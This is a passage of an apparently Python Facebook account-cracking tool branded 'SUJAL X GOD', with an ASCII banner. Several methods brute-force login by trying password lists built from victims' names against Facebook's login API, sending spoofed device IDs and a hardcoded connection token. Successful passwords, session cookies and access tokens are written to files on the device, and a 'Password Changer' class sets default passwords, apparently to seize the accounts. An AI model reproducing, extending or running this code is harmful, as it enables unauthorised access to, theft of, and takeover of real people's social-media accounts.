...
/___/\____/\___/_/ |_/____/    
         ...
         \033[1;37m \033[1;33m SUJAL DON \033[1;37m
---------------------------------------------------
  Owner   >   SUJAL X GOD🙄🙏
  Github  >   sujalxgodx
  Tool    >   Private only for you public
  version >   1.0
  ---------------------------------------------------
 \033[1;37m \033[1;33m JAYY SUJAL BHAN ID AAUXA FIX💔🙏 \033[1;37m
---------------------------------------------------
---------------------------------------------------''')
	p(logo)
def clear():
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					p('\r\033[1;91m[SUJAL X GOD-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/SUJAL X GOD_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
	...
	def method2(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [SUJAL X GOD] %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'x-fb-connection-token': connection_token()}
				...
				if "session_key" in q:
					...
					token = q["access_token"]
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
					p('\r\033[1;92m[SUJAL X GOD-OK] %s | %s \033[1;97m '%(uid,pw))
					p(f" [•]\033[1;96m Cookie : {cok}\033[1;97m")
					ok.append(uid)
					open('/sdcard/SUJAL X GOD_M2_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/SUJAL X GOD_M2_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[SUJAL X GOD-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/SUJAL X GOD_M2_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
	...
	def method3(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [SUJAL X GOD] %s |  OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					p('\r\033[1;92m[SUJAL X GOD-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/SUJAL X GOD_M3_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/SUJAL X GOD_M3_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[SUJAL X GOD-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/SUJAL X GOD_M3_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
	...
	def method4(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [SUJAL X GOD] %s | M4 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
			...
			for ps in pwx:
				...
				if "session_key" in q:
					...
					p('\r\033[1;92m[SUJAL X GOD-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/SUJAL X GOD_M4_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/SUJAL X GOD_M4_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[SUJAL X GOD-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/SUJAL X GOD_M4_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
	...
	def r_crack(self,uid,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [SUJAL X GOD] %s | Random\ OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			for pw in pwx:
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					p('\r\033[1;92m[SUJAL X GOD-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/SUJAL X GOD_NUM_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/SUJAL X GOD_NUM_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[SUJAL X GOD-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/SUJAL X GOD_NUM_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
...
class automation:
	...
	def iAmPasswordManager(self):
		logo()
		p(" [•] Password Changer By : SUJAL X GOD")
		line()
	...
	def bulk_password(self):
		...
		try:
			...
			iamdefaultpassword = "SUJAL X GOD@@@"
		logo()
		p(" [•] Password Changer By : SUJAL X GOD")
		line()
	...
	def change_default(self):
		...
		try:
			...
			iamdefaultpassword = "SUJAL X GOD786"
